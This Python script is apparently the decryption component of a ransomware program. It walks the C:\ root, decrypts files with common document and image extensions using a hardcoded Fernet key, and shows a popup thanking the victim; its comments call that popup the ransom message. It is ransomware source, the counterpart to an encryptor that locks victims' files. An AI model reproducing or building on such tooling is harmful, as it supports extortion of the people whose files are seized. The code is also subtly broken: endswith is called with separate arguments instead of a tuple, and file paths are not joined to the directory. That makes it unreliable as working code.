import tkinter, os
from tkinter import messagebox
from cryptography.fernet import Fernet

def decrypt():
    # Decrypt the already encrypted files
    key = "aWC5hXgG06c4lCmPpWxEuczPacxTa1TId-yw3hjZI9E="

    if os.path.isdir("C:\\"):
        # Get files to work with
        for f_name in os.listdir('C:\\'):
            if f_name.endswith('.txt', '.pdf','.ppt', '.xlsx',
                               '.png', '.jpeg','.docx', '.doc'):
                file_name = f_name

                # Start decryption
                fn = file_name
                k = key
                f = Fernet(k)

                with open(fn, "rb") as file:
                    encrypted_data = file.read()

                decrypted_data = f.decrypt(encrypted_data)
                with open(fn, "wb") as file:
                    file.write(decrypted_data)
            else:
                pass
    else:
        pass


def message():
    # this function prompts a window containing the ransom message
    window = tkinter.Tk()
    window.wm_withdraw()
    header = "HELLO... YOUR FILES HAVE BEEN DECRYPTED"
    body = "THANK YOU"
    messagebox.showinfo(title=header, message=body)


def main():
    decrypt()
    message()


if __name__ == '__main__':
    main()